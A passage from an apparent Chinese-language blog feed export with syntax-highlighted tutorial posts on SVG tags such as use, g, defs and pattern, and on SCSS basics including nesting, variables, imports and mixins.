class="string">"50"</span> <span class="attr">y</span>=<span class="string">"25"</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">10. `<span class="tag">&lt;<span class="name">use</span>&gt;</span>` 标签  </span><br><span class="line">    `<span class="tag">&lt;<span class="name">use</span>&gt;</span>` 标签用于复制一个形状 </span><br><span class="line"></span><br><span class="line">    ``` xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 30 10"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"myuse"</span> <span class="attr">cx</span>=<span class="string">"5"</span> <span class="attr">cy</span>=<span class="string">"5"</span> <span class="attr">r</span>=<span class="string">"4"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">    ```  </span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 30 10"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">id</span>=<span class="string">"myuse"</span> <span class="attr">cx</span>=<span class="string">"5"</span> <span class="attr">cy</span>=<span class="string">"5"</span> <span class="attr">r</span>=<span class="string">"4"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"10"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myuse"</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">11. `<span class="tag">&lt;<span class="name">g</span>&gt;</span>` 标签  </span><br><span class="line">    `<span class="tag">&lt;<span class="name">g</span>&gt;</span>` 标签用于将多个形状组成一个组（group）</span><br><span class="line"></span><br><span class="line">    ``` xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">"myg"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"25"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>圆形<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"20"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myg"</span> <span class="attr">x</span>=<span class="string">"100"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myg"</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure> <div style="width: 500px; height: 200px; margin: 15px 0;background: #fff;"><br>     <svg width="300" height="100"><br/>         <g id="myg"><br/>             <text x="25" y="20">圆形</text><br/>             <circle cx="50" cy="50" r="20"/><br/>         </g><br/>         <use href="#myg" x="100" y="0" fill="blue"/><br/>         <use href="#myg" x="200" y="0" fill="white" stroke="blue"/><br/>     </svg><br> </div></li><li><p><code>&lt;defs&gt;</code> 标签<br><code>&lt;defs&gt;</code> 标签用于自定义形状，它内部的代码不会显示，仅供引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">"myCircle"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"25"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>圆形<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"20"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"100"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">use</span> <span class="attr">href</span>=<span class="string">"#myCircle"</span> <span class="attr">x</span>=<span class="string">"200"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">fill</span>=<span class="string">"white"</span> <span class="attr">stroke</span>=<span class="string">"blue"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><div style="width: 500px; height: 200px; margin: 15px 0;background: #fff;"><br>    <svg width="300" height="100"><br/>        <defs><br/>            <g id="myCircle"><br/>                <text x="25" y="20">圆形</text><br/>                <circle cx="50" cy="50" r="20"/><br/>            </g><br/>        </defs><br/>        <use href="#myCircle" x="0" y="0"/><br/>        <use href="#myCircle" x="100" y="0" fill="blue"/><br/>        <use href="#myCircle" x="200" y="0" fill="white" stroke="blue"/><br/>    </svg><br></div></li><li><p><code>&lt;pattern&gt;</code> 标签<br><code>&lt;pattern&gt;</code> 标签用于自定义一个形状，该形状可以被引用来平铺一个区域</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">height</span>=<span class="string">"500"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span> <span class="attr">id</span>=<span class="string">"dots"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">patternUnits</span>=<span class="string">"userSpaceOnUse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">circle</span> <span class="attr">fill</span>=<span class="string">"#bee9e8"</span> <span class="attr">cx</span>=<span class="string">"50"</span> <span class="attr">cy</span>=<span class="string">"50"</span> <span class="attr">r</span>=<span class="string">"35"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">fill</span>=<span class="string">"url(#dots)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">&lt;!-- patternUnits="userSpaceOnUse"表示&lt;pattern&gt;的宽度和长度是实际的像素值 --&gt;</span></span><br></pre></td></tr></table></figure><div style="display:inline-block;border: 1px solid blue;"><br>    <svg width="500" height="500"><br/>        <defs><br/>            <pattern id="dots" x="0" y="0" width="100" height="100" patternunits="userSpaceOnUse"><br/>                <circle fill="#bee9e8" cx="50" cy="50" r="35"/><br/>            </pattern><br/>        </defs><br/>        <rect x="0" y="0" width="100%" height="100%" fill="url(#dots)"/><br/>    </svg><br></div></li><li><p><code>&lt;image&gt;</code> 标签<br><code>&lt;image&gt;</code> 标签用于插入图片文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">viewBox</span>=<span class="string">"0 0 100 100"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">image</span> <span class="attr">xlink:href</span>=<span class="string">"//avatars3.githubusercontent.com/u/22409333?s=460&amp;v=4"</span> <span class="attr">width</span>=<span class="string">"50%"</span> <span class="attr">height</span>=<span class="string">"50%"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><svg viewbox="0 0 100 100" width="500" height="500"><br/>    <image xlink:href="https://avatars3.githubusercontent.com/u/22409333?s=460&v=4" width="50%" height="50%"><br/></image></svg></li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SVG 可缩放矢量图形（Scalable Vector Graphics，SVG)，是一种用来描述二维矢量图形的 XML 标记语言&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="HTML+CSS" scheme="https://jiuylq.github.io/tags/HTML-CSS/"/>
    
  </entry>
  
  <entry>
    <title>SCSS 入门</title>
    <link href="https://jiuylq.github.io/2018/12/13/scss/"/>
    <id>https://jiuylq.github.io/2018/12/13/scss/</id>
    <published>2018-12-13T08:31:09.000Z</published>
    <updated>2019-04-07T05:20:53.417Z</updated>
    
    <content type="html"><![CDATA[<p>SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="scss入门篇"><a href="#scss入门篇" class="headerlink" title="scss入门篇"></a>scss入门篇</h2><blockquote><p><a href="http://www.cnblogs.com/iovec/p/8024408.html" target="_blank" rel="noopener">链接</a>  </p></blockquote><h3 id="是-Sass-还是-SCSS？"><a href="#是-Sass-还是-SCSS？" class="headerlink" title="是 Sass 还是 SCSS？"></a>是 Sass 还是 SCSS？</h3><blockquote><p>SCSS 是 Sass 3 引入的新语法，语法上完全兼容原生 CSS，功能上完全继承 Sass，可以说是 CSS 和 Sass 的完美融合。SCSS 之于 Sass 犹如 CSS3 之于 CSS，ES6 之于 JS。所以别纠结，其实是一个东西啦。</p></blockquote><h3 id="一、嵌套写法"><a href="#一、嵌套写法" class="headerlink" title="一、嵌套写法"></a>一、嵌套写法</h3><p><strong>css原生写法</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.name</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.age</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span>&#123;</span><br><span class="line">    <span class="selector-class">.content</span>&#123;</span><br><span class="line">        <span class="selector-class">.left-side</span>&#123;</span><br><span class="line">            <span class="selector-class">.profile</span>&#123;</span><br><span class="line">                <span class="selector-class">.name</span>&#123;</span><br><span class="line">                    <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="selector-class">.age</span>&#123;</span><br><span class="line">                    <span class="attribute">color</span>: red;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>编译后</strong><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.name</span>&#123;<span class="attribute">font-size</span>: <span class="number">2rem</span>;&#125;</span><br><span class="line"><span class="selector-class">.page</span> <span class="selector-class">.content</span> <span class="selector-class">.left-side</span> <span class="selector-class">.profile</span> <span class="selector-class">.age</span>&#123;<span class="attribute">color</span>: red;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="二、属性值的复用——定义变量"><a href="#二、属性值的复用——定义变量" class="headerlink" title="二、属性值的复用——定义变量"></a>二、属性值的复用——定义变量</h3><blockquote><p>变量一直是所有编程语言的标准配置。然而 CSS 就没有，再次证明 CSS 可能是一门假语言。好在 Sass 补上了这个短板。<br><strong>css原生写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.success-bg</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#dff0d8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.success-panel</span>&#123;</span><br><span class="line">    <span class="selector-class">.panel-heading</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#dff0d8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.panel-body</span>&#123;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dff0d8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$success-color</span>: <span class="number">#dff0d8</span>;</span><br><span class="line"><span class="selector-class">.success-bg</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="variable">$success-color</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.success-panel</span>&#123;</span><br><span class="line">    <span class="selector-class">.panel-heading</span>&#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="variable">$success-color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.panel-body</span>&#123;</span><br><span class="line">        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="variable">$success-color</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="三、文件级的复用——模块系统"><a href="#三、文件级的复用——模块系统" class="headerlink" title="三、文件级的复用——模块系统"></a>三、文件级的复用——模块系统</h3><blockquote><p>模块化是软件工程的第一要务，是大型项目的必需建筑。软件工程的主要目标就是控制复杂度，这也正是模块化的目的。通过将一个大型复杂的工程拆解成一个个的小模块，使得校验、调试、测试都轻而易举。<br>CSS原生的 <code>@import</code> 提供了一个并没有卵用的假模块系统。Sass 对 <code>@import</code> 进行了拓展，实现了一个真正意义上甚至功能更强大的模块系统。Sass 选择对 <code>@import</code> 进行扩展，而不是新建一个指令，可见 import 这个关键字的语义之强，JavaScript 模块系统的关键字也是 <code>import</code>。<br><strong>css原生写法</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/common.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/popup.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/module_a.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/site.css"</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p><strong>scss写法</strong><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* site.scss */</span></span><br><span class="line">@<span class="keyword">import</span> <span class="string">"common"</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">"popup"</span>;</span><br><span class="line">@<span class="keyword">import</span> <span class="string">"module_a"</span>;</span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- index.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/your/site/site.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="四、展示层的复用——混合指令"><a href="#四、展示层的复用——混合指令" class="headerlink" title="四、展示层的复用——混合指令"></a>四、展示层的复用——混合指令</h3><blockquote><p>混合(mixin)特别类似于 JavaScript 中的函数，然而 Sass 提供了用于表达式计算的 @function 函数指令，这里就不好这么类比了。但其实就是这么个东西，调用的时候会返回一段样式。<br>Mixin是SASS中非常强大的特性之一。定义mixin时，需要在前面加@mixin，使用时需要添加@include来引用该mixin。<br><strong>比如下面一段存在重复样式的代码。</strong><br><em>复用之前</em><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p><em>稍作优化</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>, <span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>似乎不错，但是之后再新加类似样式时，</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span>, <span class="selector-class">.article</span>, <span class="selector-class">.style01</span>, <span class="selector-class">.style02</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="selector-class">.style01</span>&#123;&#125;</span><br><span class="line"><span class="selector-class">.style02</span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>每次都要改两个地方，很麻烦，很容易漏，尤其是将通用样式分离出来的话更容易出错。<br><em>再做优化：</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.grey-border-radius</span>&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>似乎好了一点，但这样的话，html 每个使用的标签都需要多加上一个 <code>.grey-border-radius</code> 类。很显然这是多余的。这种做法可以说是“凑合”。<br><em>使用 Sass 复用之后：</em><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">mixin</span> grey-border-radius&#123;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.description</span>&#123;</span><br><span class="line">    @<span class="keyword">include</span> grey-border-radius;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span>&#123;</span><br><span class="line">    @<span class="keyword">include</span> grey-border-radius;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>编译后的 css 输出：</em><br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.description</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.article</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e3e3e3</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继承<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">include</span> aa</span><br><span class="line">@<span class="keyword">extend</span> aa</span><br><span class="line"></span><br><span class="line">@function</span><br><span class="line"></span><br><span class="line"><span class="variable">$baseFontSize</span>: 10px !default;</span><br><span class="line"><span class="variable">$gray</span>: <span class="number">#ccc</span> !default;</span><br><span class="line"></span><br><span class="line">@function pxToRem(<span class="variable">$px</span>) &#123;</span><br><span class="line">    @return <span class="variable">$px</span> / baseFontSize * 1rem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="variable">$baseFontSize</span>;</span><br><span class="line">    <span class="attribute">color</span>:lighten(<span class="variable">$gray</span>,<span class="number">10%</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.text</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:pxToRem(<span class="number">16px</span>);</span><br><span class="line">    <span class="attribute">color</span>:darken(<span class="variable">$gray</span>,<span class="number">10%</span>);</span><br><span 